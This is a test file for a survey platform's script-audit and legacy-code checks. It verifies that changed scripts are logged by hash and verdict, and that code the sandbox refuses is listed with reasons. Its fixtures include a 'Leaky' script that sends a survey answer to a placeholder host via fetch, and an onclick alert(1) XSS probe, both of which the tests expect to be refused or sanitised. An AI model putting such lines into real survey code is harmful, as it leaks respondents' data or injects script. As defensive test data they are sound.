import { test } from "node:test";
import assert from "node:assert/strict";
import { SurveyDefinition } from "@rescript/schema";
import { diffScriptItems, fnv64, jqueryProblems, legacyRefusalOutline, legacyScriptRefusals, scriptAuditDetail, scriptAuditSentence, scriptItems } from "./scriptAudit.js";
import { migrateLegacyCustomCode } from "./legacyScripts.js";

/* S1c item 3 (SE-29): one audit entry per changed piece of code — never the code, a hash and the check's verdict */

const survey = (extra: Record<string, unknown> = {}, q2: Record<string, unknown> = {}) => SurveyDefinition.parse({
  meta: { id: "s", code: "S", title: "T" },
  questions: [
    { id: "q1", code: "Q1", variableName: "A", type: "single_select", text: "A?", options: [{ code: 1, label: "Yes" }, { code: 2, label: "No" }] },
    { id: "q2", code: "Q2", variableName: "B", type: "custom_component", text: "B?", customJs: "el.className = 'x';", ...q2 },
  ],
  flow: [{ type: "block", id: "b", title: "B", children: [{ type: "page", id: "p", questionIds: ["q1", "q2"] }] }, { type: "end", id: "e", status: "complete" }],
  ...extra,
});
const behaviour = (id: string, label: string, script?: string, extra: Record<string, unknown> = {}) => ({ id, label, target: { kind: "survey" }, effects: script ? [] : [{ do: "add_class", className: "x" }], ...(script ? { script } : { on: "page_enter" }), ...extra });
const ux = (...behaviors: unknown[]) => ({ ux: { styles: [], animations: [], behaviors } });
const logic = (code: string, enabled = true, name = "Spend band") => ({ scripts: [{ id: "sc1", name, code, enabled }] });

test("no code change, no entry: identical definitions and a style-only edit of a script behaviour", () => {
  const a = survey({ ...ux(behaviour("b1", "Banner", "rs.addClass('Q1', 'hi');")), ...logic("set('X', 1);") });
  assert.deepEqual(diffScriptItems(a, a), []);
  const relabel = survey({ ...ux(behaviour("b1", "Banner", "rs.addClass('Q1', 'hi');", { once: true })), ...logic("set('X', 1);") });
  assert.deepEqual(diffScriptItems(a, relabel), [], "diffUx sees the behaviour changed; its script did not");
  // a behaviour without a script is not code
  const plain = survey(ux(behaviour("b2", "Plain")));
  assert.deepEqual(diffScriptItems(survey(), plain), []);
});

test("added / changed / removed per item, with hashes, lengths and the check's verdict", () => {
  const before = survey({ ...ux(behaviour("b1", "Banner", "rs.addClass('Q1', 'hi');")), ...logic("set('X', 1);") });
  const after = survey({
    ...ux(behaviour("b1", "Banner", "rs.addClass('Q1', 'bye');"), behaviour("b2", "Leaky", "fetch('https://x.example/' + rs.getAnswer('Q1'));")),
    branding: { headerHtml: "<p onclick=\"alert(1)\">Hi</p>", customCss: ".a{color:red}" },
  }, { customJs: "el.className = 'y';" });
  const ch = diffScriptItems(before, after);
  const by = (id: string) => ch.find((c) => c.itemId === id)!;
  assert.deepEqual(ch.map((c) => `${c.action} ${c.kind} ${c.itemId}`), [
    "script.changed ux_script b1",
    "script.added ux_script b2",
    "script.changed component_js q2:js",
    "script.added branding_header branding:header",
    "script.added branding_css branding:css",
    "script.removed logic_script sc1",
  ]);
  assert.equal(by("b1").verdict?.status, "passed");
  assert.equal(by("b2").verdict?.status, "refused");
  assert.match(by("b2").verdict!.reasons.join(" "), /fetch/);
  assert.equal(by("branding:header").verdict?.status, "sanitised");
  assert.equal(by("branding:css").verdict?.status, "passed");
  assert.equal(by("sc1").verdict, null, "a removal has no verdict");
  assert.equal(by("sc1").afterHash, null);
  assert.equal(by("sc1").beforeHash, fnv64("set('X', 1);"));
  assert.equal(by("b1").length, "rs.addClass('Q1', 'bye');".length);
  // a server hash is used when given
  assert.equal(diffScriptItems(before, after, () => "H")[0]!.afterHash, "H");
});

test("enabled / disabled: one entry per item, code edits in the same save are flagged", () => {
  const on = survey(logic("set('X', 1);", true));
  const off = survey(logic("set('X', 1);", false));
  assert.deepEqual(diffScriptItems(on, off).map((c) => c.action), ["script.disabled"]);
  const offEdited = survey(logic("set('X', 2);", false));
  const back = diffScriptItems(offEdited, on);
  assert.equal(back.length, 1);
  assert.equal(back[0]!.action, "script.enabled");
  assert.equal(back[0]!.codeChanged, true);
  // a logic script the gate refuses
  const bad = diffScriptItems(on, survey(logic("window.location = 'x';", true)));
  assert.equal(bad[0]!.verdict?.status, "refused");
  assert.match(bad[0]!.verdict!.reasons[0]!, /window/);
});

test("the stored detail never holds the code; the sentence reads like the Versions panel line", () => {
  const secret = "set('X', 'TOP-SECRET-CODE');";
  const [c] = diffScriptItems(survey(), survey(logic(secret)));
  const detail = scriptAuditDetail(c!);
  assert.ok(!JSON.stringify(detail).includes("TOP-SECRET-CODE"));
  assert.deepEqual(Object.keys(detail).sort(), ["afterHash", "beforeHash", "itemId", "kind", "length", "name", "reasons", "verdict"]);
  assert.equal(scriptAuditSentence("script.changed", { kind: "logic_script", name: "Spend band", verdict: "passed" }, "Ana"), "Logic script ‘Spend band’ changed by Ana — passed the check");
  assert.equal(scriptAuditSentence("script.added", { kind: "ux_script", name: "Leaky", verdict: "refused", reasons: ["fetch is not available"] }, "Bo"), "Script ‘Leaky’ added by Bo — refused by the check: fetch is not available");
  assert.equal(scriptAuditSentence("script.removed", { kind: "component_js", name: "Q2 component script", verdict: null }, "Cy"), "Component script ‘Q2 component script’ removed by Cy");
  assert.equal(scriptAuditSentence("script.enabled", { kind: "logic_script", name: "S", verdict: "passed", codeChanged: true }, "Di"), "Logic script ‘S’ switched on and edited by Di — passed the check");
});

test("scriptItems: every code-bearing field, and a first save with no pre-image compares against nothing", () => {
  const d = survey({ branding: { headerHtml: "<b>h</b>", footerHtml: "<i>f</i>", customCss: "a{}", customJs: "x()" }, ...logic("set('X',1);") }, { customHtml: "<button>1</button>", customCss: ".b{}" });
  assert.deepEqual(scriptItems(d).map((x) => x.kind), ["logic_script", "component_js", "component_html", "question_css", "branding_header", "branding_footer", "branding_css", "branding_js"]);
  assert.equal(diffScriptItems(null, d).length, 8);
  assert.ok(diffScriptItems(null, d).every((c) => c.action === "script.added"));
  assert.equal(fnv64("a").length, 16);
  assert.notEqual(fnv64("a"), fnv64("b"));
});

/* S1c item 4 (D17): migrated / imported code that will not run is listed with its reasons, never silently dead */

test("legacy refusals: moved Custom code using window / $ / setInterval, a refused import, a refused component", () => {
  const raw = SurveyDefinition.parse({
    meta: { id: "s", code: "S", title: "T" },
    questions: [
      { id: "q1", code: "Q1", variableName: "A", type: "single_select", text: "A?", options: [{ code: 1, label: "Yes" }], customJs: "$('.rs-next').hide(); window.foo = 1;" },
      { id: "q2", code: "Q2", variableName: "B", type: "custom_component", text: "B?", customJs: "fetch('https://x.example');" },
      { id: "q3", code: "Q3", variableName: "C", type: "single_select", text: "C?", options: [{ code: 1, label: "Yes" }], customJs: "el.classList.add('ok');" },
    ],
    flow: [{ type: "block", id: "b", title: "B", children: [{ type: "page", id: "p", questionIds: ["q1", "q2", "q3"] }] }, { type: "end", id: "e", status: "complete" }],
    branding: { customJs: "setInterval(function () { tick(); }, 1000);" },
    scripts: [
      { id: "sc1", name: "Old timer", code: "window.setTimeout(function () { set('X', 1); }, 10);", enabled: false, notes: "Script check: refused — window is not available." },
      { id: "sc2", name: "Fine", code: "set('X', 1);" },
    ],
  });
  const def = migrateLegacyCustomCode(raw).def;
  const list = legacyScriptRefusals(def);
  const by = (n: string) => list.find((r) => r.name.includes(n))!;
  assert.deepEqual(list.map((r) => r.kind).sort(), ["component_js", "logic_script", "ux_script", "ux_script"]);
  assert.equal(by("Q1").origin, "question Q1's Custom code");
  assert.ok(by("Q1").names.includes("$"), JSON.stringify(by("Q1")));
  assert.ok(by("Q1").names.includes("window"), JSON.stringify(by("Q1")));
  assert.equal(by("Survey custom JavaScript").origin, "Branding custom JavaScript");
  assert.ok(by("Survey custom JavaScript").names.includes("setInterval"));
  assert.ok(by("Old timer").names.includes("window"));
  assert.ok(by("Q2").names.includes("fetch"));
  assert.ok(by("Q1").code.includes("$('.rs-next')"), "the code is there for Show the code");
  assert.ok(!list.some((r) => r.name.includes("Q3") || r.name === "Fine"), "code that runs is not listed");
  const outline = legacyRefusalOutline(def);
  assert.match(outline[0]!, /Code that will NOT run \(4;/);
  assert.equal(outline.length, 5);
  assert.ok(!outline.join("\n").includes("rs-next"), "the outline gives reasons, not the code");
  assert.deepEqual(legacyRefusalOutline(survey()), []);
});

test("jqueryProblems: $ / jQuery calls, unless the code declares its own $", () => {
  assert.equal(jqueryProblems("$('#a').hide();").length, 1);
  assert.equal(jqueryProblems("jQuery('#a').hide();").length, 1);
  assert.deepEqual(jqueryProblems("const $ = (s) => document.querySelector(s); $('#a');"), []);
  assert.deepEqual(jqueryProblems("const price = '$5'; rs.log(price);"), []);
  assert.deepEqual(jqueryProblems("var a$b = 1; a$b.x;"), []);
});
